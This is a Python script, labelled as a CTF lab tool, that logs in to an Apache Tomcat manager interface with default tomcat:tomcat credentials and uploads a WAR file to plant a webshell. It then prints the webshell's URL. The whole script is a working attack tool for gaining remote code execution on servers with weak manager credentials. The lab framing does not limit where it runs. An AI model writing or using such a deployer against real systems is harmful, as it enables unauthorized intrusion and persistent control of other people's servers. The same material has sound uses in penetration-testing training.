#!/usr/bin/env python3
"""
Tomcat Manager WAR Deployer for CTF Labs
Usage: python3 tomcat_deploy.py -u <url> -w webshell.war
"""

import requests
import argparse
import sys
from pathlib import Path
from requests.auth import HTTPBasicAuth


def deploy_war(base_url: str, username: str, password: str, war_path: Path, app_name: str):
    base_url = base_url.rstrip("/")
    deploy_url = f"{base_url}/manager/text/deploy"

    if not war_path.exists():
        print(f"[!] WAR file not found: {war_path}")
        sys.exit(1)

    auth = HTTPBasicAuth(username, password)

    # --- Step 1: Check authentication via server info endpoint ---
    print(f"[*] Target      : {base_url}")
    print(f"[*] Credentials : {username}:{password}")
    print(f"[*] WAR file    : {war_path} ({war_path.stat().st_size} bytes)")
    print("-" * 50)

    print("[*] Testing authentication...")
    info_url = f"{base_url}/manager/text/serverinfo"
    try:
        r = requests.get(info_url, auth=auth, timeout=10, verify=False)
    except requests.ConnectionError:
        print(f"[!] Cannot connect to {base_url}. Is the host up?")
        sys.exit(1)

    if r.status_code == 401:
        print(f"[-] Authentication failed (401). Wrong credentials.")
        sys.exit(1)
    elif r.status_code == 403:
        print(f"[-] Forbidden (403). User lacks manager-script role.")
        sys.exit(1)
    elif r.status_code == 200:
        print(f"[+] Authentication successful!")
    else:
        print(f"[!] Unexpected status {r.status_code} on auth check.")

    # --- Step 2: Upload and deploy the WAR ---
    print(f"[*] Deploying /{app_name} ...")
    params = {"path": f"/{app_name}", "update": "true"}

    with open(war_path, "rb") as f:
        war_data = f.read()

    headers = {"Content-Type": "application/octet-stream"}

    r = requests.put(
        deploy_url,
        auth=auth,
        params=params,
        data=war_data,
        headers=headers,
        timeout=30,
        verify=False,
    )

    if r.status_code == 200 and r.text.startswith("OK"):
        print(f"[+] Deployment successful!")
        print(f"[+] Webshell URL: {base_url}/{app_name}/")
        print(f"\n[*] Response: {r.text.strip()}")
    else:
        print(f"[-] Deployment failed (HTTP {r.status_code})")
        print(f"    Response: {r.text.strip()}")


def main():
    parser = argparse.ArgumentParser(description="Tomcat WAR Deployer for CTF Labs")
    parser.add_argument("-u", "--url",      required=True,                  help="Tomcat base URL (e.g. http://10.10.10.5:8080)")
    parser.add_argument("-U", "--username", default="tomcat",               help="Manager username (default: tomcat)")
    parser.add_argument("-P", "--password", default="tomcat",               help="Manager password (default: tomcat)")
    parser.add_argument("-w", "--war",      default="webshell.war",         help="Path to WAR file (default: webshell.war)")
    parser.add_argument("-n", "--name",     default="webshell",             help="App context name (default: webshell)")
    args = parser.parse_args()

    deploy_war(
        base_url=args.url,
        username=args.username,
        password=args.password,
        war_path=Path(args.war),
        app_name=args.name,
    )


if __name__ == "__main__":
    main()
